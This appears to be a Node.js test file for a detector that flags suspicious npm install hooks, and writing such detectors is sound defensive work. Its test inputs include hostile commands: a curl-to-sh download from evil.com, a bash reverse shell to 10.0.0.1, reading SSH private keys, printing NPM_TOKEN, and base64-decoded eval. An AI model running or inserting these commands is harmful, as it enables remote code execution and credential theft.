import { describe, it } from 'node:test'
import assert from 'node:assert/strict'
import { analyzeScripts } from '../src/script-analysis.js'

describe('analyzeScripts', () => {
  it('returns clean for scripts without install hooks', () => {
    const result = analyzeScripts({ build: 'tsc', test: 'jest' })
    assert.strictEqual(result.suspicious, false)
    assert.strictEqual(result.risks.length, 0)
  })

  it('returns clean for undefined scripts', () => {
    const result = analyzeScripts(undefined)
    assert.strictEqual(result.suspicious, false)
  })

  it('returns clean for legitimate postinstall', () => {
    const result = analyzeScripts({ postinstall: 'node scripts/download-binary.js' })
    assert.strictEqual(result.suspicious, false)
  })

  it('detects curl pipe sh', () => {
    const result = analyzeScripts({ postinstall: 'curl https://evil.com/setup.sh | sh' })
    assert.strictEqual(result.suspicious, true)
    assert.ok(result.risks.some(r => r.severity === 'critical'))
  })

  it('detects environment variable access', () => {
    const result = analyzeScripts({ preinstall: 'node -e "console.log(process.env.NPM_TOKEN)"' })
    assert.strictEqual(result.suspicious, true)
    assert.ok(result.risks.some(r => r.description.includes('environment variables')))
  })

  it('detects reverse shell pattern', () => {
    const result = analyzeScripts({ postinstall: 'bash -i >& /dev/tcp/10.0.0.1/8080 0>&1' })
    assert.strictEqual(result.suspicious, true)
    assert.ok(result.risks.some(r => r.severity === 'critical'))
  })

  it('detects ssh key access', () => {
    const result = analyzeScripts({ install: 'cat ~/.ssh/id_rsa' })
    assert.strictEqual(result.suspicious, true)
    assert.ok(result.risks.some(r => r.description.includes('SSH keys')))
  })

  it('detects eval with decoded content', () => {
    const result = analyzeScripts({ postinstall: 'eval(Buffer.from("payload","base64").toString())' })
    assert.strictEqual(result.suspicious, true)
    assert.ok(result.risks.some(r => r.description.includes('obfuscated')))
  })

  it('detects /bin/ssh typosquatting', () => {
    const result = analyzeScripts({ install: '/bin/ssh setup.sh' })
    assert.strictEqual(result.suspicious, true)
    assert.ok(result.risks.some(r => r.description.includes('/bin/ssh')))
  })

  it('ignores non-install scripts', () => {
    const result = analyzeScripts({ build: 'curl https://evil.com | sh', test: 'eval(process.env.SECRET)' })
    assert.strictEqual(result.suspicious, false)
  })
})
